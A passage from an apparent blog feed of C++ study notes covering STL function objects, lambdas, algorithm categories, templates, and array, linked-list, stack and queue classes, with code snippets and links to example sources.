</span>&#123;</span><br><span class="line"><span class="type">int</span> a[] = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> &#125;;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="built_in">sizeof</span>(a) / <span class="built_in">sizeof</span>(<span class="type">int</span>);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;The result by multipling all elements in a is &quot;</span> &lt;&lt; <span class="built_in">accumulate</span>(a, a + N, <span class="number">1</span>, mult) &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;numeric&gt;</span> <span class="comment">//Include numerical algorithm header file</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MultClass</span>&#123; <span class="comment">//Define MultClass class</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">//Overload operator operator()</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">operator</span><span class="params">()</span> <span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> x * y; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> a[] = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> &#125;;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="built_in">sizeof</span>(a) / <span class="built_in">sizeof</span>(<span class="type">int</span>);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;The result by multipling all elements in a is &quot;</span> &lt;&lt; <span class="built_in">accumulate</span>(a, a + N, <span class="number">1</span>, <span class="built_in">MultClass</span>()) <span class="comment">//MultClass object passed to generic algorithm </span></span><br><span class="line">&lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>One ordinary function, one class overloads ().</p><p>Function objects provided by STL: * Function objects for arithmeticoperations * Function objects for relational operations and logicaloperations (require return value to be bool)</p><p><imgsrc="https://pic4.zhimg.com/80/v2-0e4a6bbd4d06bb5765d22c2d1662cdad_1440w.jpeg" /></p><p><imgsrc="https://pica.zhimg.com/80/v2-7df16ba33fcbf887ef22acad3f7855ee_1440w.jpeg" /></p><h2 id="lambda-expressions">Lambda Expressions</h2><p><a href="https://www.cnblogs.com/DswCnblog/p/5629165.html">LambdaExpression Details</a> Definition: [capture list] (parameter list) -&gt;return type {function body} * Capture list can capture local variablesof the function where lambda is located * Parameter list, return typeand function body are consistent with ordinary functions * Can bedefined inside functions, understood as unnamed inline functions * autolambda = [] { return “Hello World!”; }; * cout&lt;&lt; lambda()&lt;&lt;std::endl; //Execution is consistent with function objects</p><p>Capture list has value capture, reference capture and implicitcapture methods * int size = 10, base = 0; //Local variables * autolonger = <a href="const%20string%20&amp;s">size</a>{returns.size()&gt;size;} //Value capture * auto longer = <ahref="const%20string%20&amp;s">&amp;size</a>{returns.size()&gt;size;}//Reference capture * auto longer = <ahref="const%20string%20&amp;s">=</a>{return s.size()&gt;base;}//Implicitvalue capture * auto longer = <ahref="const%20string%20&amp;s">&amp;</a>{returns.size()&gt;size;}//Implicit reference capture ## Function Adapters <imgsrc="https://pic4.zhimg.com/80/v2-2ed3c65215b6553242c0785fb1c84ae7_1440w.jpeg" /></p><p>bind2nd produces an instance of binder2nd function adapter<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> placeholders; <span class="comment">//Namespace for placeholder _n</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> intArr[] = &#123; <span class="number">30</span>, <span class="number">90</span>, <span class="number">10</span>, <span class="number">40</span>, <span class="number">70</span>, <span class="number">50</span>, <span class="number">20</span>, <span class="number">80</span> &#125;;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="built_in">sizeof</span>(intArr) / <span class="built_in">sizeof</span>(<span class="type">int</span>);</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">a</span><span class="params">(intArr, intArr + N)</span></span>;</span><br><span class="line"><span class="keyword">auto</span> p = <span class="built_in">find_if</span>(a.<span class="built_in">begin</span>(), a.<span class="built_in">end</span>(),<span class="built_in">bind2nd</span>(greater&lt;&gt;(), <span class="number">40</span>));</span><br><span class="line"><span class="keyword">if</span> (p == a.<span class="built_in">end</span>())</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;no element greater than 40&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;first element greater than 40 is: &quot;</span> &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>Function templates have much more content, learn gradually inpractice</p></blockquote><h1 id="algorithms">Algorithms</h1><p>Characteristics of algorithms: * STL algorithms are themselvesfunction templates * Get input data through iterators * Process datathrough function objects * Output results through iterators * STLalgorithms are generic, independent of specific data types and containertypes</p><p>Classification of algorithms: * Non-mutable sequence algorithms *Mutable sequence algorithms * Sorting and searching algorithms *Numerical algorithms</p><blockquote><p>All algorithms used in the code can be found in the images, so noexplanation is given.</p></blockquote><h2 id="non-mutable-sequence-algorithms">Non-Mutable SequenceAlgorithms</h2><p>Algorithms that do not directly modify the content of the operatedcontainer, used for finding specified elements, comparing whether twosequences are equal, counting elements, etc.</p><p><imgsrc="https://pic3.zhimg.com/80/v2-cbe6b4025b2427cf9b3936eb3a467b96_1440w.png" /></p><p>Example: <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> InputIterator, <span class="keyword">class</span> UnaryPredicate&gt;</span></span><br><span class="line"><span class="function">InputIterator <span class="title">find_if</span><span class="params">(InputIterator first, InputIterator last, UnaryPredicate pred)</span></span>;</span><br><span class="line"><span class="comment">//Find the first element in [first, last) range where pred(x) is true</span></span><br></pre></td></tr></table></figure></p><p><ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/%E4%B8%8D%E5%8F%AF%E5%8F%98%E5%BA%8F%E5%88%97%E7%AE%97%E6%B3%95%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/main.cpp">Non-MutableSequence Algorithm Examples</a></p><h2 id="mutable-sequence-algorithms">Mutable Sequence Algorithms</h2><p>Can modify the container objects they operate on, includingalgorithms for copying, deleting, replacing, reversing, rotating,swapping, partitioning, deduplicating, filling, shuffling sequences andgenerating a sequence.</p><p><imgsrc="https://pic3.zhimg.com/80/v2-ec3de91c8801e4fbb7993a038d8ba58e_1440w.png" /></p><p><imgsrc="https://picx.zhimg.com/80/v2-e1eedaedbe50397fdac1453674369c25_1440w.png" /></p><p>Example: <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> ForwardIterator, <span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fill</span><span class="params">(ForwardIterator first, ForwardIterator last, <span class="type">const</span> T&amp; x)</span></span>;</span><br><span class="line"><span class="comment">//Rewrite all elements in [first, last) range to x.</span></span><br></pre></td></tr></table></figure></p><div class="note danger flat"><p><ahref="https://blog.csdn.net/qq_27788829/article/details/51181080?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-51181080-blog-80187847.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-51181080-blog-80187847.pc_relevant_default&amp;utm_relevant_index=1">TheDeceptive Nature of remove_if</a></p></div><blockquote><p>Removing is done by shifting (by means of copy assignment (untilC++11)move assignment (since C++11)) the elements in the range in such away that the elements that are not to be removed appear in the beginningof the range. Relative order of the elements that remain is preservedand the <em>physical</em> size of the container is unchanged. Iteratorspointing to an element between the new <em>logical</em> end andthe <em>physical</em> end of the range are still dereferenceable, butthe elements themselves have unspecified values (as per <ahref="https://en.cppreference.com/w/cpp/named_req/MoveAssignable"title="cpp/named req/MoveAssignable">MoveAssignable</a> post-condition).</p></blockquote><p><ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/%E5%8F%AF%E5%8F%98%E5%BA%8F%E5%88%97%E7%AE%97%E6%B3%95%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/main.cpp">MutableSequence Algorithm Examples</a></p><h2 id="sorting-and-searching-algorithms">Sorting and SearchingAlgorithms</h2><ul><li>Sort sequences</li><li>Merge two ordered sequences</li><li>Search ordered sequences</li><li>Set operations on ordered sequences</li><li>Heap algorithms</li></ul><p><imgsrc="https://pic2.zhimg.com/80/v2-d880ec033f01b154525a1600bad9c14f_1440w.jpeg" /></p><p><imgsrc="https://pic3.zhimg.com/80/v2-e367dca4110be05e688ba80abffe29be_1440w.jpeg" /></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">RandomAccessIterator</span> , <span class="keyword">class</span> <span class="title class_">UnaryPredicate</span>&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sort</span><span class="params">(RandomAccessIterator first, RandomAccessIterator last, UnaryPredicate comp)</span></span>;</span><br><span class="line"><span class="comment">//Use function object comp as &quot;&lt;&quot; to sort data in [first, last) range</span></span><br></pre></td></tr></table></figure><blockquote><p>sort requires first and last to be random iterator types, becausesort’s specific implementation uses quicksort, and using randomiterators is for efficiency considerations.</p></blockquote><h2 id="numerical-algorithms">Numerical Algorithms</h2><p>Find the “sum” of elements in a sequence, partial “sum”, “difference”of adjacent elements, or inner product of two sequences. The “+” forfinding “sum”, “-” for finding “difference”, and “+” and “·” for findinginner product can all be specified by function objects.</p><p><imgsrc="https://pic2.zhimg.com/80/v2-b20e0971749bf96f4e9e97fdb6121fd2_1440w.png" /></p><p>Example: <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">InputIterator</span>, <span class="keyword">class</span> <span class="title class_">OutputIterator</span>, <span class="keyword">class</span> <span class="title class_">BinaryFunction</span>&gt; ▫ <span class="function">OutputIterator <span class="title">partial_sum</span><span class="params">(InputIterator first, InputIterator last, OutputIterator result, BinaryFunction op)</span></span>;</span><br><span class="line"><span class="comment">//Find partial &quot;sum&quot; of elements in [first, last) (so-called partial &quot;sum&quot; is a sequence with the same length as the input sequence, where the nth term is the &quot;sum&quot; of the first n elements of the input sequence)</span></span><br><span class="line"><span class="comment">//Use function object op as &quot;+&quot; operator, output result through result, return iterator pointing to the element after the last element of the output sequence</span></span><br></pre></td></tr></table></figure></p><p>[Numerical AlgorithmExamples](https://github.com/hustlixiang21/cpp-practice/tree/main/%E6%95%B0%E5%80%BC%E7%AE%97%E6%B3%95%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B</p><h1 id="comprehensive-example---bank-account-management">ComprehensiveExample - Bank Account Management</h1><p><ahref="https://github.com/hustlixiang21/cpp-practice/tree/main/Personal_bank_management_update4">SourceCode + Updates</a></p>]]></content>
      
      
      <categories>
          
          <category> C/C++ Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Templates and Data Organization</title>
      <link href="/2022/08/04/CPP/Templates%20and%20Data%20Organization/"/>
      <url>/2022/08/04/CPP/Templates%20and%20Data%20Organization/</url>
      
        <content type="html"><![CDATA[<h1 id="function-templates-and-class-templates">Function Templates andClass Templates</h1><p>Templates can implement <strong>parametric polymorphism</strong>,which parameterizes the types of objects that programs process, enablinga single program to handle multiple <strong>different types</strong> ofobjects.</p><h2 id="function-templates">Function Templates</h2><p>The purpose of function templates is simply to avoid repetitivewriting of functions that only differ in the <strong>data types</strong>they handle, greatly improving code reusability and thus enhancingsoftware development efficiency.</p><p>The syntax form adds the statement<code>template&lt;template parameter list&gt;</code> before the functiondefinition</p><p>Contents of the template parameter list:</p><ul><li>Type parameters: class (or typename) identifier</li><li>Constant parameters: type specifier identifier</li><li>Template parameters: template<parameter list> class identifier</li></ul><p>Example:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Universal absolute value function</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function">T <span class="title">abs</span><span class="params">(T x)</span></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x&gt;<span class="number">0</span> ? x : -x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><div class="note danger flat"><p>Function templates are fundamentally different from functions</p><ol type="1"><li>Function templates themselves <strong>do not generate</strong> anyobject code at compile time; only instances of function templatesgenerate object code.</li><li>Function templates referenced by multiple source files need to beplaced in header files along with the function body, not just thedeclaration like ordinary functions.</li><li>Function pointers can only point to instances of function templates,<strong>not to function templates</strong>.</li></ol></div></p><h2 id="class-templates">Class Templates</h2><p>Using class templates allows you to define a pattern for a class,enabling certain data members, parameters of certain member functions,return values, or local variables in the class to take any type.</p><p>The declaration method of class templates is the same as functiontemplates,</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Define member functions outside the class template</span></span><br><span class="line"><span class="keyword">template</span>&lt;模板参数表&gt;</span><br><span class="line">类型名 类名&lt;模板参数标识符列表&gt;::函数名(参数表)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Use template class to define objects</span></span><br><span class="line">模板名&lt;模版参数类型&gt;对象名<span class="number">1</span>,...,对象名n;</span><br></pre></td></tr></table></figure><h1 id="linear-groups">Linear Groups</h1><p>Linear groups, as the name suggests, have elements whose positionscorrespond to their positional relationships. They can be classifiedinto direct access, sequential access, and indexed access. Direct accessmeans jumping directly to the position that needs to be accessed withoutfollowing order, while sequential access can only access from thebeginning according to the element arrangement order.</p><h2 id="direct-access-groups---array-class">Direct Access Groups - ArrayClass</h2><p>Required to design a variable-length array, <ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/%E6%95%B0%E7%BB%84%E7%B1%BB%E6%A8%A1%E7%89%88/Array.h">clickto view source code</a>, and list some syntax points to note.</p><p><div class="note info flat"><p>Syntax rules state that “=”, “[ ]”, “( )”, “-&gt;” can only beoverloaded as member functions, and the “=” operator function in derivedclasses will always hide the “=” operator in the base class.</p></div></p><p>If we want to use Array class objects like ordinary arrays inprograms, we need to overload the pointer conversion operator.</p><h3 id="role-of-pointer-conversion-operator">Role of Pointer ConversionOperator</h3><p>To explain the necessity of overloading the pointer conversionoperator, let’s first look at the following program:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">read</span> <span class="params">(<span class="type">int</span> *p, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++）</span><br><span class="line">        cin&gt;&gt;p[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="built_in">main</span>()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">read</span>(a,<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Here, the first parameter of the read function is an int pointer, andthe array name a is an int address constant, so the types match exactly.If we want to use Array class objects like ordinary arrays in programs,modify the main function as follows:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="function">Arrays&lt;<span class="type">int</span>&gt; <span class="title">a</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line">    <span class="built_in">read</span>(a,<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>What will happen? This time when calling read, it will be found thatthe actual parameter type is different from the formal parameter type.At this point, the compilation system will attempt automatic typeconversion: converting the object name to int * type. Since a is acustom type object, the automatic conversion function provided by thecompilation system <strong>cannot implement this conversion</strong>, sowe need to write our own overloaded pointer type conversion function. InC++, if you want to implicitly or explicitly convert an object of customtype T to type S, you can define operator S as a member function of T.This way, when converting a T type object implicitly to S type, or usingstatic_cast to explicitly convert to S type, this member function willbe called. The overloaded function of the conversion operator does notneed to specify the return value type, because in this case <strong>thereturn type of the overloaded function is consistent with the operatorname</strong>, so the C++ standard stipulates that return value typescannot be specified for such functions (and void should not be written).When the object itself is a constant, to avoid modifying array contentthrough pointers, the object can only be converted to a constantpointer.</p><p>The way to overload the pointer conversion operator in this Arrayclass is as follows:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">Array&lt;T&gt;::<span class="keyword">operator</span> T *()  <span class="comment">//不用写返回值的类型</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> list;<span class="comment">//First address of the array</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="sequential-access-groups---linked-list-class">Sequential AccessGroups - Linked List Class</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// LinkedList.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LINKEDLIST_H </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LINKEDLIST_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Node.h&quot;</span></span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkedList</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Node&lt;T&gt; *front, *rear;      <span class="comment">//Head and tail pointers</span></span><br><span class="line">    Node&lt;T&gt; *prevPtr, *currPtr; <span class="comment">//Pointers recording current traversal position in the list, updated by insert and delete operations</span></span><br><span class="line">    <span class="type">int</span> size;                   <span class="comment">//Number of elements in the list</span></span><br><span class="line">    <span class="type">int</span> position;               <span class="comment">//Position index of current element in the list. Used by reset function</span></span><br><span class="line">    <span class="comment">//Generate new node with data field item and pointer field ptrNext</span></span><br><span class="line">    <span class="function">Node&lt;T&gt; *<span class="title">newNode</span><span class="params">(<span class="type">const</span> T &amp;item, Node&lt;T&gt; *ptrNext = <span class="literal">NULL</span>)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">freeNode</span><span class="params">(Node&lt;T&gt; *p)</span></span>; <span class="comment">//Free node</span></span><br><span class="line">    <span class="comment">//Copy linked list L to current list (assuming current list is empty), called by copy constructor and operator =</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">copy</span><span class="params">(<span class="type">const</span> LinkedList&lt;T&gt; &amp;L)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">LinkedList</span>();                                     <span class="comment">//Constructor</span></span><br><span class="line">    <span class="built_in">LinkedList</span>(<span class="type">const</span> LinkedList&lt;T&gt; &amp;L);               <span class="comment">//Copy constructor</span></span><br><span class="line">    ~<span class="built_in">LinkedList</span>();                                    <span class="comment">//Destructor</span></span><br><span class="line">    LinkedList&lt;T&gt; &amp;<span class="keyword">operator</span>=(<span class="type">const</span> LinkedList&lt;T&gt; &amp;L); <span class="comment">//Overloaded assignment operator</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getSize</span><span class="params">()</span> <span class="type">const</span></span>;                              <span class="comment">//Return number of elements in linked list bool isEmpty() const; //Whether linked list is empty</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">reset</span><span class="params">(<span class="type">int</span> pos = <span class="number">0</span>)</span></span>;                          <span class="comment">//Initialize cursor position</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">next</span><span class="params">()</span></span>;                                      <span class="comment">//Move cursor to next node</span></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">endOfList</span><span class="params">()</span> <span class="type">const</span></span>;                           <span class="comment">//Whether cursor has reached end of list</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">currentPosition</span><span class="params">()</span> <span class="type">const</span></span>;                      <span class="comment">//Return current cursor position</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">insertFront</span><span class="params">(<span class="type">const</span> T &amp;item)</span></span>;                  <span class="comment">//Insert node at head</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">insertRear</span><span class="params">(<span class="type">const</span> T &amp;item)</span></span>;                   <span class="comment">//Add node at tail</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">insertAt</span><span class="params">(<span class="type">const</span> T &amp;item)</span></span>;                     <span class="comment">//Insert node before current node</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">insertAfter</span><span class="params">(<span class="type">const</span> T &amp;item)</span></span>;                  <span class="comment">//Insert node after current node</span></span><br><span class="line">    <span class="function">T <span class="title">deleteFront</span><span class="params">()</span></span>;                                  <span class="comment">//Delete head node</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">deleteCurrent</span><span class="params">()</span></span>;                             <span class="comment">//Delete current node</span></span><br><span class="line">    <span class="function">T &amp;<span class="title">data</span><span class="params">()</span></span>;                                        <span class="comment">//Return reference to current node member data</span></span><br><span class="line">    <span class="function"><span class="type">const</span> T &amp;<span class="title">data</span><span class="params">()</span> <span class="type">const</span></span>;                            <span class="comment">//Return const reference to current node member data</span></span><br><span class="line">    <span class="comment">//Clear linked list: free memory space of all nodes. Called by destructor and operator=</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">clear</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// LINKEDLIST_H </span></span></span><br><span class="line"><span class="comment">//Linked list class template function implementation code can be downloaded from the internet</span></span><br></pre></td></tr></table></figure><p>Basic operations of linked lists:</p><ul><li>Generate linked list</li><li>Insert nodes</li><li>Search nodes</li><li>Delete nodes</li><li>Traverse linked list</li><li>Clear linked list</li></ul><h2 id="stack-class">Stack Class</h2><p><strong>Stack class template implementation</strong>, <ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/stack_calculator/Stack.h">clickto view source code</a>.</p><p>Stack elements can actually be represented using<strong>arrays</strong> or <strong>linked lists</strong>.</p><p>Basic operations of stacks:</p><ul><li>Initialize</li><li>Push</li><li>Pop</li><li>Clear stack</li><li>Access top element</li><li>Check stack status (full, empty)</li></ul><h2 id="queue-class">Queue Class</h2><p>Designed as a circular queue using arrays, which is quite troublesomefor additions and deletions. Actually, I think using linked listswouldn’t require circular implementation.</p><p><ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/%E9%98%9F%E5%88%97%E7%B1%BB%E6%A8%A1%E7%89%88/Queue.h">Clickhere to view source code</a></p><h1 id="organization-of-group-arrays">Organization of Group Arrays</h1><p>Simple sorting and searching are quite basic, so some images andlinks are inserted here for better understanding.</p><p><imgsrc="https://pic3.zhimg.com/80/v2-7da3a687b4b607d415bbf4617768727f_1440w.jpeg" /></p><p><a href="https://labuladong.github.io/algo/1/11/">I wrote a poemabout binary search - labuladong</a></p><h1id="comprehensive-example---improvement-of-personal-bank-account-management-program">ComprehensiveExample - Improvement of Personal Bank Account Management Program</h1><p><ahref="https://github.com/hustlixiang21/cpp-practice/tree/main/Personal_bank_management_update_3">Viewsource code click here</a></p>]]></content>
      
      
      <categories>
          
          <category> C/C++ Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Polymorphism</title>
      <link href="/2022/07/31/CPP/Polymorphism/"/>
      <url>/2022/07/31/CPP/Polymorphism/</url>
      
